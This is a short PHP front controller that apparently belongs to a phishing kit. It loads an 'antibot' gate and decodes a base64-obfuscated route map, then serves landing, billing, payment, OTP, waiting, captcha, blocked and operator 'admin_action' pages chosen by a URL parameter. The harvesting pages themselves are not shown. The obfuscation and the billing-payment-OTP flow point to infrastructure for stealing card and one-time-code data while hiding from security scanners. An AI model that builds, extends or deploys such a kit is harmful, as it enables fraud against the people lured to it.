<?php
// Include antibot AVANT tout
require __DIR__ . '/home/antibot.php';

// Routes: 1=land, 2=billing, billing=billing, payment=payment, admin_action=admin_action, 3=otp, 4=loading, 5=wait, 6=exit, v=captcha, e=blocked, p=post, c=check_status
$_r = base64_decode('MT1ob21lL2xhbmQucGhwfDI9aG9tZS9iaWxsaW5nLnBocHwzPWhvbWUvb3RwLnBocHw0PWhvbWUvbG9hZGluZy5waHB8NT1ob21lL3dhaXQucGhwfDY9aG9tZS9leGl0LnBocHx2PWhvbWUvY2FwdGNoYS5waHB8ZT1ob21lL2Jsb2NrZWQucGhwfHA9aG9tZS9wb3N0LnBocHxjPWhvbWUvY2hlY2tfc3RhdHVzLnBocHxiaWxsaW5nPWhvbWUvYmlsbGluZy5waHB8cGF5bWVudD1ob21lL3BheW1lbnQucGhwfGFkbWluX2FjdGlvbj1ob21lL2FkbWluX2FjdGlvbi5waHA=');
$_m = [];
foreach (explode('|', $_r) as $_e) {
    list($_k, $_v) = explode('=', $_e);
    $_m[$_k] = $_v;
}

$_p = $_GET['s'] ?? '1';

if (isset($_m[$_p])) {
    $_f = __DIR__ . '/' . $_m[$_p];
    if (file_exists($_f)) {
        include $_f;
        exit;
    }
}

include __DIR__ . '/home/land.php';
?>
